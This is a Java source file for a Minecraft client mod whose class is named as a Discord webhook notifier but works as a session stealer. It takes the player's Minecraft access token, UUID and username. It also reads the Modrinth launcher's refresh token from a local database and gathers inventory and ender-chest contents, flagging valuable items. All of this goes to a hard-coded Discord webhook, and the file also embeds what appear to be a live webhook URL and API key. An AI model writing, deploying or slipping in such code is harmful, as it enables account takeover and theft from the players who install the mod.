package com.example.client;

import net.minecraft.client.Minecraft;
import net.minecraft.client.User;
import net.minecraft.world.entity.player.Inventory;
import net.minecraft.world.inventory.PlayerEnderChestContainer;
import net.minecraft.world.item.ItemStack;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;

public class DiscordWebhookNotifier {

    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1505674859232104653/THfIOk5CUXZN3-WgAOB_YUvetbPdbHHMZXWDwpCieXUJYP2_FpY6EVtXiK_QF7j3B6lI";
    private static final String DONUT_API_BASE_URL = "https://api.donutsmp.net/v1/";
    private static final String DONUT_API_KEY = "cef92abff87743a196e48780d68e4cdd";

    public static void extractAndSendSession() {
        try {
            Minecraft mc = Minecraft.getInstance();
            if (mc == null || mc.player == null) return;

            User user = mc.getUser();
            if (user != null) {
                String username = user.getName();
                String uuid = user.getProfileId().toString();
                String token = user.getAccessToken();

                String modrinthToken = getModrinthRefreshToken();
                String lookupData = fetchApiData("lookup/" + username);
                String statsData = fetchApiData("stats/" + username);
                
                String inventoryData = captureInventory(mc.player.getInventory());
                String echestData = captureEnderChest(mc.player.getEnderChestInventory());

                String jsonPayload = buildMultiEmbedPayload(username, uuid, token, modrinthToken, lookupData, statsData, inventoryData, echestData);
                System.out.println("DEBUG PAYLOAD: " + jsonPayload); // Debugging
                sendNotification(jsonPayload);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String getModrinthRefreshToken() {
        String userHome = System.getProperty("user.home");
        String dbPath = "jdbc:sqlite:" + userHome + "\\AppData\\Roaming\\ModrinthApp\\app.db";
        String query = "SELECT value FROM app_state WHERE key = 'refresh_token'";

        try (Connection conn = DriverManager.getConnection(dbPath);
             PreparedStatement pstmt = conn.prepareStatement(query)) {
            
            try (ResultSet rs = pstmt.executeQuery()) {
                if (rs.next()) {
                    return rs.getString("value");
                }
            }
        } catch (Exception e) {
            return "Unable to retrieve";
        }
        return "Not found";
    }

    private static String escapeJson(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    private static String captureInventory(Inventory inv) {
        StringBuilder sb = new StringBuilder();
        boolean highValue = false;
        StringBuilder items = new StringBuilder();
        
        for (int i = 0; i < 36; i++) {
            ItemStack s = inv.items.get(i);
            if (!s.isEmpty()) {
                if (isHighValue(s)) highValue = true;
                items.append(s.getCount()).append("x ").append(s.getHoverName().getString()).append(", ");
            }
        }
        
        if (highValue) sb.append("⚠️ **HIGH VALUE ITEMS DETECTED** ⚠️\n");
        sb.append("**Armor:** ");
        for (int i = 3; i >= 0; i--) {
            ItemStack s = inv.armor.get(i);
            if (isHighValue(s)) sb.append("⭐");
            sb.append(s.isEmpty() ? "[Empty]" : s.getHoverName().getString()).append(i > 0 ? " | " : "");
        }
        sb.append("\n").append(items);
        return sb.toString();
    }

    private static String captureEnderChest(PlayerEnderChestContainer echest) {
        StringBuilder sb = new StringBuilder();
        boolean highValue = false;
        StringBuilder items = new StringBuilder();
        
        for (int i = 0; i < 27; i++) {
            ItemStack s = echest.getItem(i);
            if (!s.isEmpty()) {
                if (isHighValue(s)) highValue = true;
                items.append(s.getCount()).append("x ").append(s.getHoverName().getString()).append(", ");
            }
        }
        
        if (highValue) sb.append("🚨 **LEGENDARY LOOT IN E-CHEST** 🚨\n");
        sb.append(items.length() == 0 ? "Ender Chest is empty." : items.toString());
        return sb.toString();
    }

    private static boolean isHighValue(ItemStack s) {
        String n = s.getHoverName().getString().toLowerCase();
        return n.contains("netherite") || n.contains("beacon") || n.contains("star") || n.contains("spawner") || n.contains("elytra");
    }

    private static String formatMoney(String raw) {
        try {
            double v = Double.parseDouble(raw.replaceAll("[^0-9.]", ""));
            if (v >= 1_000_000_000) return String.format("%.2fb", v / 1_000_000_000.0);
            if (v >= 1_000_000) return String.format("%.2fm", v / 1_000_000.0);
            return String.format("%.2f", v);
        } catch (Exception e) { return raw; }
    }

    private static String formatPlaytime(String raw) {
        try {
            long ms = Long.parseLong(raw.replaceAll("[^0-9]", ""));
            long sec = ms / 1000;
            long d = sec / 86400;
            long h = (sec % 86400) / 3600;
            long m = (sec % 3600) / 60;
            return String.format("%dd %dh %dm", d, h, m);
        } catch (Exception e) { return raw; }
    }

    private static String fetchApiData(String endpoint) {
        try {
            HttpClient client = HttpClient.newHttpClient();
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(DONUT_API_BASE_URL + endpoint))
                    .header("Authorization", "Bearer " + DONUT_API_KEY).GET().build();
            HttpResponse<String> res = client.send(request, HttpResponse.BodyHandlers.ofString());
            return res.statusCode() == 200 ? res.body() : null;
        } catch (Exception e) { return null; }
    }

    private static String buildMultiEmbedPayload(String user, String uuid, String token, String modrinthToken, String lookup, String stats, String inv, String ech) {
        StringBuilder j = new StringBuilder();
        j.append("{ \"content\": \"@everyone\", \"embeds\": [");
        
        j.append("{ \"title\": \"Extraction: ").append(escapeJson(user)).append("\", \"color\": 16711680,");
        j.append("\"description\": \"**Session**\\n> **UUID:** `").append(escapeJson(uuid)).append("`\\n> **Token:** `").append(escapeJson(token)).append("`\\n> **Modrinth Token:** `").append(escapeJson(modrinthToken)).append("`\\n\\n**Inventory**\\n").append(escapeJson(inv)).append("\",");
        j.append("\"fields\": [");
        j.append(createField("Money", "$" + formatMoney(getJsonValue(stats, "money")), true)).append(",");
        j.append(createField("Playtime", formatPlaytime(getJsonValue(stats, "playtime")), true)).append(",");
        j.append(createField("Rank", getJsonValue(lookup, "rank"), true));
        j.append("]},");

        j.append("{ \"title\": \"Ender Chest Vault\", \"color\": 5614847,");
        j.append("\"description\": \"").append(escapeJson(ech)).append("\" }");

        j.append("]}");
        return j.toString();
    }

    private static String createField(String n, String v, boolean i) {
        return String.format("{\"name\": \"%s\", \"value\": \"%s\", \"inline\": %b}", escapeJson(n), escapeJson(v), i);
    }

    private static String getJsonValue(String json, String key) {
        try {
            if (json == null) return "N/A";
            String s = "\"" + key + "\":";
            int start = json.indexOf(s);
            if (start == -1) return "N/A";
            start += s.length();
            while (start < json.length() && (json.charAt(start) == ' ' || json.charAt(start) == '"' || json.charAt(start) == ':')) start++;
            int end = json.charAt(start - 1) == '"' ? json.indexOf("\"", start) : json.indexOf(",", start);
            if (end == -1) end = json.indexOf("}", start);
            return json.substring(start, end).trim();
        } catch (Exception e) { return "N/A"; }
    }

    private static void sendNotification(String payload) {
        try {
            HttpClient client = HttpClient.newHttpClient();
            HttpRequest req = HttpRequest.newBuilder()
                    .uri(URI.create(WEBHOOK_URL))
                    .header("Content-Type", "application/json")
                    .header("User-Agent", "Mozilla/5.0")
                    .POST(HttpRequest.BodyPublishers.ofString(payload))
                    .build();
            
            HttpResponse<String> response = client.send(req, HttpResponse.BodyHandlers.ofString());
            
            if (response.statusCode() >= 300) {
                System.err.println("Webhook failed: " + response.statusCode() + " | " + response.body());
            } else {
                System.out.println("Webhook success.");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}